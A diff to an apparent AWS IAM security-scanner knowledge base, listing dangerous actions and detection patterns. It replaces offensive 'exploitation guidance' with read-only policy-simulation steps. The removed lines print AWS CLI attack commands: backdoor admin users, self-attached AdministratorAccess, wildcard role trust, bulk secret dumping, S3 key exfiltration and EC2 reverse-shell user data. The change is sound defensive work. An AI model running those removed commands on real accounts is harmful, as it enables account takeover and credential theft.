@@ -1,6 +1,6 @@
-"""Security knowledge base: dangerous IAM actions, privesc technique patterns, MITRE ATT&CK mappings, CVSS vectors, exploitation guidance and query catalogs."""
+"""Security knowledge base: dangerous actions, techniques, MITRE mappings, validation guidance and query catalogs."""
 
-from typing import Any, Dict, List, Optional
+from typing import Dict, List, Optional
 
 
 AWS_MANAGED_PATTERNS = [
@@ -23,7 +23,7 @@ DANGEROUS_ACTIONS = {
     "sts:AssumeRole", "sts:AssumeRoleWithSAML", "sts:AssumeRoleWithWebIdentity",
     "secretsmanager:GetSecretValue", "ssm:GetParameter", "ssm:GetParameters",
     "ssm:GetParametersByPath", "ssm:SendCommand", "ssm:StartSession",
-    "s3:GetObject", "s3:PutBucketPolicy", "s3:PutObject",
+    "s3:GetObject", "s3:PutBucketPolicy", "s3:PutObject", "s3:DeleteObject",
     "ec2:RunInstances", "ec2:AssociateIamInstanceProfile",
     "lambda:CreateFunction", "lambda:UpdateFunctionCode",
     "lambda:UpdateFunctionConfiguration", "lambda:AddPermission", "lambda:InvokeFunction",
@@ -39,7 +39,7 @@ DANGEROUS_ACTIONS = {
     "ecs:RunTask", "ecs:RegisterTaskDefinition",
     "states:CreateStateMachine", "datapipeline:CreatePipeline",
     "cloudtrail:StopLogging", "cloudtrail:DeleteTrail",
-    "guardduty:DeleteDetector", "config:StopConfigurationRecorder",
+    "guardduty:DeleteDetector", "config:StopConfigurationRecorder", "kms:Decrypt",
 }
 
 
@@ -62,7 +62,7 @@ TECHNIQUE_PATTERNS = {
     "Trust Policy Modification": [r"UpdateAssumeRolePolicy", r"trust.*policy", r"trust document"],
     "Policy Attachment": [r"Attach.*Policy", r"Put.*Policy", r"attach.*administrator"],
     "Policy Version": [r"CreatePolicyVersion", r"SetDefaultPolicyVersion"],
-    "Lambda CreateFunction": [r"lambda:CreateFunction", r"create.*function.*role"],
+    "Lambda CreateFunction": [r"lambda:CreateFunction", r"lambda.*create.*function", r"create.*function.*role"],
     "Lambda UpdateFunctionCode": [r"lambda:UpdateFunctionCode", r"update.*function.*code"],
     "Lambda Configuration": [r"lambda:UpdateFunctionConfiguration"],
     "EC2 Instance Profile": [r"ec2:RunInstances.*PassRole", r"instance.*profile", r"ec2.*role"],
@@ -111,7 +111,7 @@ IAM_CHECKS = {
 S3_CHECKS = {"s3:GetObject", "s3:PutBucketPolicy", "s3:PutObject", "s3:DeleteObject"}
 
 
-CRED_CHECKS = {"secretsmanager:GetSecretValue", "ssm:GetParameter", "ssm:GetParameters", "ssm:GetParametersByPath"}
+CRED_CHECKS = {"secretsmanager:GetSecretValue", "ssm:GetParameter", "ssm:GetParameters", "ssm:GetParametersByPath", "kms:Decrypt"}
 
 
 EVASION_CHECKS = {"cloudtrail:StopLogging", "cloudtrail:DeleteTrail", "guardduty:DeleteDetector", "config:StopConfigurationRecorder"}
@@ -142,7 +142,7 @@ CHECK_LABEL = {
     "iam:PutRolePolicy":            "Write allow-all inline policies to any IAM role",
     "iam:PutGroupPolicy":           "Write allow-all inline policies to any IAM group",
     "iam:SetDefaultPolicyVersion":  "Revert managed policies to older permissive versions",
-    "iam:PassRole":                 "Pass privileged roles to EC2, Lambda, ECS, or other services",
+    "iam:PassRole":                 "Pass permitted IAM roles to AWS services (resource and conditions apply)",
     "iam:UpdateAssumeRolePolicy":   "Rewrite role trust policies to grant themselves access",
     "iam:CreatePolicyVersion":      "Create new policy versions with elevated permissions",
     "iam:AddUserToGroup":           "Add users to privileged groups",
@@ -155,10 +155,11 @@ CHECK_LABEL = {
     "s3:PutBucketPolicy":           "Rewrite S3 bucket policies to expose buckets publicly",
     "s3:PutObject":                 "Upload/overwrite any object in S3 buckets",
     "s3:DeleteObject":              "Delete any object from S3 buckets",
+    "kms:Decrypt":                  "Decrypt data protected by accessible KMS keys",
     "ec2:RunInstances":             "Launch EC2 instances with privileged instance profiles",
     "lambda:UpdateFunctionCode":    "Replace Lambda function code to abuse the execution role",
     "lambda:AddPermission":         "Grant external accounts access to Lambda functions",
-    "lambda:CreateFunction":        "Create new Lambda functions with a privileged execution role",
+    "lambda:CreateFunction":        "Create Lambda functions (execution-role use requires iam:PassRole)",
     "glue:CreateJob":               "Create Glue ETL jobs running with a privileged role",
     "glue:UpdateJob":               "Modify existing Glue jobs to run with a privileged role",
     "cloudformation:CreateStack":   "Deploy CloudFormation stacks under a privileged role",
@@ -258,25 +259,21 @@ EXPLOITATION_GUIDANCE = {
             "business": "Full account compromise, potential regulatory violations, data breach liability",
         },
         "exploitation_steps": [
-            "1. Obtain credentials for the admin principal (access keys, session tokens, or console access)",
-            "2. Verify admin access: aws sts get-caller-identity && aws iam list-attached-user-policies --user-name <NAME>",
-            "3. Enumerate sensitive data: aws s3 ls --recursive | grep -i secret",
-            "4. Extract secrets: aws secretsmanager list-secrets && aws secretsmanager get-secret-value --secret-id <ID>",
-            "5. Create backdoor access: aws iam create-user --user-name backdoor && aws iam attach-user-policy --user-name backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
+            "1. Confirm the principal and its current policy attachments",
+            "2. Simulate representative write, read, and delete actions against exact resources",
+            "3. Check permissions boundaries, SCPs, RCPs, resource policies, and session policy constraints",
+            "4. Treat full account takeover as the impact of credential compromise, not as proof that compromise occurred",
         ],
-        "aws_cli_commands": '''# Verify admin access
-aws sts get-caller-identity
-aws iam simulate-principal-policy --policy-source-arn <ARN> --action-names "*" --resource-arns "*"
+        "aws_cli_commands": '''# Inventory attached and inline policies (choose role or user)
+aws iam list-attached-role-policies --role-name <ROLE_NAME>
+aws iam list-role-policies --role-name <ROLE_NAME>
+aws iam list-attached-user-policies --user-name <USER_NAME>
+aws iam list-user-policies --user-name <USER_NAME>
 
-# Exfiltrate secrets
-aws secretsmanager list-secrets
-aws ssm get-parameters-by-path --path "/" --recursive --with-decryption
-
-# Create persistence
-aws iam create-access-key --user-name <ADMIN_USER>
-aws iam create-user --user-name attacker-backdoor
-aws iam attach-user-policy --user-name attacker-backdoor \\
-    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess''',
+# Safely simulate representative actions; replace with exact actions/resources
+aws iam simulate-principal-policy --policy-source-arn <PRINCIPAL_ARN> \\
+    --action-names iam:CreateUser s3:DeleteBucket \\
+    --resource-arns <EXACT_RESOURCE_ARN>''',
         "evidence": "Look for attached policy: arn:aws:iam::aws:policy/AdministratorAccess",
         "references": [
             "https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html",
@@ -297,26 +294,18 @@ aws iam attach-user-policy --user-name attacker-backdoor \\
         },
         "exploitation_steps": [
             "1. Identify the escalation vector (iam:AttachRolePolicy, iam:PutUserPolicy, etc.)",
-            "2. Escalate privileges: aws iam attach-user-policy --user-name <SELF> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
-            "3. Alternatively create a new policy version: aws iam create-policy-version --policy-arn <ARN> --policy-document file://admin-policy.json --set-as-default",
-            "4. Or modify role trust: aws iam update-assume-role-policy --role-name <ADMIN_ROLE> --policy-document file://trust-self.json",
-            "5. Assume escalated role or use new permissions",
+            "2. Confirm the exact target resource, policy ARN constraints, and Condition values",
+            "3. Verify any complementary permissions and target trust required by the modeled graph edge",
+            "4. Use policy simulation and configuration review; do not mutate a customer identity to prove impact",
         ],
-        "aws_cli_commands": '''# Method 1: Attach admin policy to self
-aws iam attach-user-policy --user-name $(aws sts get-caller-identity --query Arn --output text | cut -d'/' -f2) \\
-    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+        "aws_cli_commands": '''# Inspect source policies and the target role without changing them
+aws iam list-attached-role-policies --role-name <SOURCE_ROLE_NAME>
+aws iam list-role-policies --role-name <SOURCE_ROLE_NAME>
+aws iam get-role --role-name <TARGET_ROLE_NAME>
 
-# Method 2: Create permissive policy version
-cat > /tmp/admin.json << 'EOF'
-{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}
-EOF
-aws iam create-policy-version --policy-arn <POLICY_ARN> --policy-document file:///tmp/admin.json --set-as-default
-
-# Method 3: Add self to admin role trust
-aws iam update-assume-role-policy --role-name AdminRole --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"*"},"Action":"sts:AssumeRole"}]}'
-
-# Method 4: Create access keys for admin user
-aws iam create-access-key --user-name admin-user''',
+# Simulate the exact action and target ARN shown by the finding
+aws iam simulate-principal-policy --policy-source-arn <SOURCE_PRINCIPAL_ARN> \\
+    --action-names <EVIDENCED_ACTION> --resource-arns <TARGET_RESOURCE_ARN>''',
         "evidence": "Check for actions: iam:AttachRolePolicy, iam:AttachUserPolicy, iam:PutRolePolicy, iam:PutUserPolicy, iam:CreatePolicyVersion, iam:UpdateAssumeRolePolicy, iam:CreateAccessKey with Resource:*",
         "references": [
             "https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege",
@@ -337,28 +326,17 @@ aws iam create-access-key --user-name admin-user''',
         },
         "exploitation_steps": [
             "1. Identify the escalation path and required permissions at each hop",
-            "2. Execute the first hop (e.g., assume role, create Lambda, launch EC2)",
-            "3. Continue through each hop until reaching the admin target",
+            "2. Validate each hop's source policy, resource scope, conditions, and target trust",
+            "3. Verify organization and resource guardrails that the static graph cannot prove",
             "4. Common patterns: iam:PassRole + service abuse, sts:AssumeRole chain, credential harvesting",
         ],
-        "aws_cli_commands": '''# STS AssumeRole escalation
-aws sts assume-role --role-arn <TARGET_ROLE_ARN> --role-session-name escalation
+        "aws_cli_commands": '''# Validate each identity-policy side of the path without executing it
+aws iam simulate-principal-policy --policy-source-arn <SOURCE_PRINCIPAL_ARN> \\
+    --action-names <HOP_ACTION> --resource-arns <HOP_TARGET_ARN>
 
-# Lambda function abuse (PassRole + CreateFunction)
-aws lambda create-function --function-name escalate \\
-    --runtime python3.9 --role <PRIVILEGED_ROLE_ARN> \\
-    --handler index.handler --zip-file fileb://payload.zip
-aws lambda invoke --function-name escalate output.txt
-
-# EC2 instance profile abuse
-aws ec2 run-instances --image-id ami-xxx --instance-type t2.micro \\
-    --iam-instance-profile Name=<PRIVILEGED_PROFILE> --user-data file://rev-shell.sh
-
-# CodeBuild project abuse
-aws codebuild create-project --name escalate --service-role <PRIVILEGED_ROLE_ARN> \\
-    --source type=NO_SOURCE --artifacts type=NO_ARTIFACTS \\
-    --environment type=LINUX_CONTAINER,image=aws/codebuild/standard:5.0,computeType=BUILD_GENERAL1_SMALL
-aws codebuild start-build --project-name escalate''',
+# For AssumeRole/PassRole paths, inspect target trust and attached policies
+aws iam get-role --role-name <TARGET_ROLE_NAME>
+aws iam list-attached-role-policies --role-name <TARGET_ROLE_NAME>''',
         "evidence": "Look for privilege escalation edges in the graph showing paths from user/role to admin",
         "references": [
             "https://github.com/nccgroup/PMapper",
@@ -377,22 +355,19 @@ aws codebuild start-build --project-name escalate''',
             "business": "Confused deputy attacks, unauthorized access from untrusted third parties",
         },
         "exploitation_steps": [
-            "1. For wildcard trust (Principal: '*'): Any AWS account can assume the role",
-            "2. Create an AWS account or use existing one, assume the target role",
-            "3. For trusts without ExternalId: If you control/compromise the trusted account, assume directly",
-            "4. After assumption, operate with the role's permissions",
+            "1. Determine exactly which external principal and STS action the trust permits",
+            "2. Evaluate every trust-policy Condition operator and value, not just key presence",
+            "3. Confirm the external principal also has identity-side permission where AWS requires it",
+            "4. Review the target role's effective permissions to establish the actual blast radius",
         ],
-        "aws_cli_commands": '''# Assume a role with wildcard trust from ANY AWS account
-aws sts assume-role --role-arn arn:aws:iam::<TARGET_ACCOUNT>:role/<WILDCARD_ROLE> \\
-    --role-session-name attacker-session
+        "aws_cli_commands": '''# Retrieve and review the URL-decoded role trust document
+aws iam get-role --role-name <TARGET_ROLE_NAME> \\
+    --query 'Role.AssumeRolePolicyDocument'
 
-# From a trusted account without ExternalId protection
-aws sts assume-role --role-arn arn:aws:iam::<TARGET_ACCOUNT>:role/<TRUSTED_ROLE> \\
-    --role-session-name legitimate-looking
-
-# After assuming, verify access
-aws sts get-caller-identity
-aws s3 ls  # Test data access''',
+# Validate an exported trust document with IAM Access Analyzer
+aws accessanalyzer validate-policy --policy-type RESOURCE_POLICY \\
+    --validate-policy-resource-type AWS::IAM::AssumeRolePolicyDocument \\
+    --policy-document file://trust-policy.json''',
         "evidence": "Check role trust policy for Principal: '*' or missing sts:ExternalId condition",
         "references": [
             "https://docs.aws.amazon.com/IAM/latest/UserGuide/confused-deputy.html",
@@ -401,10 +376,10 @@ aws s3 ls  # Test data access''',
         ],
     },
     "overly_permissive": {
-        "title": "Overly Permissive Permissions",
+        "title": "Potentially Overly Permissive Permissions",
         "risk_rating": "High",
         "cvss_estimate": "7.5 (High)",
-        "description": "Principals have permissions significantly broader than required for their function, increasing the blast radius of a credential compromise.",
+        "description": "Static policy evidence shows multiple high-impact permissions. The tool cannot know the principal's business need, so confirm job function and all authorization guardrails before reporting the access as excessive.",
         "impact": {
             "confidentiality": "Broader access than necessary increases exposure of sensitive data",
             "integrity": "More modification capabilities than job function requires",
@@ -413,12 +388,12 @@ aws s3 ls  # Test data access''',
         },
         "exploitation_steps": [
             "1. Identify the specific dangerous permissions granted (see capability list)",
-            "2. Exploit the most impactful permissions based on your objectives",
-            "3. Common high-impact actions: s3:GetObject (data exfil), secretsmanager:GetSecretValue (creds), lambda:InvokeFunction (code exec)",
+            "2. Confirm each permission against its exact Resource and Condition values",
+            "3. Use last-accessed evidence and business purpose to determine whether the permission is actually excessive",
         ],
-        "aws_cli_commands": '''# Enumerate what you can do
-aws iam simulate-principal-policy --policy-source-arn <ARN> \\
-    --action-names "s3:*" "iam:*" "secretsmanager:*" --resource-arns "*"
+        "aws_cli_commands": '''# Simulate only the exact action/resource reported for the principal
+aws iam simulate-principal-policy --policy-source-arn <PRINCIPAL_ARN> \\
+    --action-names <EVIDENCED_ACTION> --resource-arns <EVIDENCED_RESOURCE_ARN>
 
 # Use IAM Access Analyzer to validate policies
 aws accessanalyzer validate-policy --policy-type IDENTITY_POLICY \\
@@ -426,14 +401,7 @@ aws accessanalyzer validate-policy --policy-type IDENTITY_POLICY \\
 
 # Check last accessed information for unused permissions
 aws iam generate-service-last-accessed-details --arn <PRINCIPAL_ARN>
-aws iam get-service-last-accessed-details --job-id <JOB_ID>
-
-# Data exfiltration via S3
-aws s3 sync s3://<BUCKET>/ ./exfil/ --exclude "*" --include "*.pem" --include "*.key" --include "*secret*"
-
-# Credential harvesting
-aws secretsmanager get-secret-value --secret-id <SECRET_ID>
-aws ssm get-parameter --name <PARAM_NAME> --with-decryption''',
+aws iam get-service-last-accessed-details --job-id <JOB_ID>''',
         "evidence": "Review the capability groups and specific actions listed for each principal",
         "references": [
             "https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege",
@@ -454,45 +422,38 @@ aws ssm get-parameter --name <PARAM_NAME> --with-decryption''',
             "business": "Credential theft enables access to databases, third-party services, and other systems",
         },
         "exploitation_steps": [
-            "1. List available secrets: aws secretsmanager list-secrets",
-            "2. Retrieve secret values: aws secretsmanager get-secret-value --secret-id <NAME>",
-            "3. List SSM parameters: aws ssm describe-parameters",
-            "4. Get parameter values: aws ssm get-parameter --name <NAME> --with-decryption",
-            "5. Use harvested credentials for lateral movement",
+            "1. Inventory secret and parameter metadata without retrieving values",
+            "2. Confirm the exact resource ARNs covered by each identity-policy statement",
+            "3. Check KMS key policies, resource policies, conditions, boundaries, and organization controls",
+            "4. Use policy simulation to validate authorization without exposing customer secrets",
         ],
-        "aws_cli_commands": '''# Enumerate and exfiltrate Secrets Manager
+        "aws_cli_commands": '''# Inventory secret metadata without retrieving secret values
 aws secretsmanager list-secrets --query 'SecretList[*].[Name,ARN]' --output table
-aws secretsmanager get-secret-value --secret-id <SECRET_NAME>
-
-# Enumerate and exfiltrate SSM Parameter Store
 aws ssm describe-parameters
-aws ssm get-parameters-by-path --path "/" --recursive --with-decryption
 
-# Bulk extraction
-for secret in $(aws secretsmanager list-secrets --query 'SecretList[*].Name' --output text); do
-    echo "=== $secret ===" >> secrets.txt
-    aws secretsmanager get-secret-value --secret-id $secret --query SecretString --output text >> secrets.txt 2>/dev/null
-done''',
+# Validate the exact secret read without retrieving any data
+aws iam simulate-principal-policy --policy-source-arn <PRINCIPAL_ARN> \\
+    --action-names secretsmanager:GetSecretValue --resource-arns <SECRET_ARN>''',
         "evidence": "Actions: secretsmanager:GetSecretValue, ssm:GetParameter, ssm:GetParameters, ssm:GetParametersByPath",
         "references": [
             "https://attack.mitre.org/techniques/T1552/005/",
         ],
     },
     "credential_hygiene": {
-        "title": "IAM Credential Hygiene",
-        "risk_rating": "High/Medium",
-        "cvss_estimate": "6.5 (Medium) - 8.1 (High for privileged no-MFA)",
-        "description": "IAM users with weak credential hygiene: console access without MFA, and/or long-lived access keys. These increase the likelihood and impact of credential compromise (phishing, key leakage in code/CI, credential stuffing).",
+        "title": "IAM Credential Review",
+        "risk_rating": "Context dependent",
+        "cvss_estimate": "",
+        "description": "IAM users with console access without MFA and/or active long-term access keys. Key presence alone does not prove age, exposure, non-use, or a policy violation; confirm with the credential report and last-used data.",
         "impact": {
             "confidentiality": "A phished password (no MFA) or a leaked long-term key grants the user's full permission set to an attacker",
             "integrity": "Compromised credentials allow modification of any resource the user can reach",
             "availability": "Attacker can lock out or disrupt using the compromised identity",
-            "business": "MFA absence on privileged users and unrotated static keys are the most common root cause of real cloud breaches and are flagged by CIS AWS Foundations benchmarks",
+            "business": "Actual risk depends on the principal's permissions, MFA applicability, key handling, age, and last-used evidence",
         },
         "exploitation_steps": [
-            "1. Obtain the user's console password (phishing/reuse) - no MFA means the password alone grants access",
-            "2. Or obtain a leaked long-term access key (source code, CI logs, laptop) - keys never expire until rotated",
-            "3. Authenticate and operate with the user's full permissions",
+            "1. Confirm whether the user has an active console password and MFA device",
+            "2. Collect access-key creation date, status, and last-used service/region/time",
+            "3. Determine whether each credential is required and handled according to company policy",
         ],
         "aws_cli_commands": '''# Identify users without MFA (validation)
 aws iam list-users --query 'Users[*].UserName' --output text | \\
@@ -512,17 +473,6 @@ aws iam get-access-key-last-used --access-key-id <AKIA...>''',
 }
 
 
-CVSS_VECTORS = {
-    "admin_access":        "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H (9.6 Critical)",
-    "shadow_admin":        "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H (9.6 Critical)",
-    "privesc":             "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H (9.6 Critical)",
-    "cross_account_trust": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H (10.0 Critical for wildcard; lower with conditions)",
-    "overly_permissive":   "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L (8.1 High)",
-    "secrets_access":      "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N (7.7 High)",
-    "credential_hygiene":  "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:L (7.3 High for privileged no-MFA)",
-}
-
-
 def get_exploitation_guidance(finding_category: str) -> Dict:
     """Get exploitation guidance for a finding category."""
     category_map = {
@@ -539,7 +489,10 @@ def get_exploitation_guidance(finding_category: str) -> Dict:
     }
     key = category_map.get(finding_category, "overly_permissive")
     guidance = dict(EXPLOITATION_GUIDANCE.get(key, EXPLOITATION_GUIDANCE["overly_permissive"]))
-    guidance["cvss_vector"] = CVSS_VECTORS.get(key, "")
+    # A static IAM graph lacks the environment and business context required for
+    # a defensible CVSS score, so do not present one as computed proof.
+    guidance["cvss_estimate"] = ""
+    guidance["cvss_vector"] = ""
     return guidance
 
 
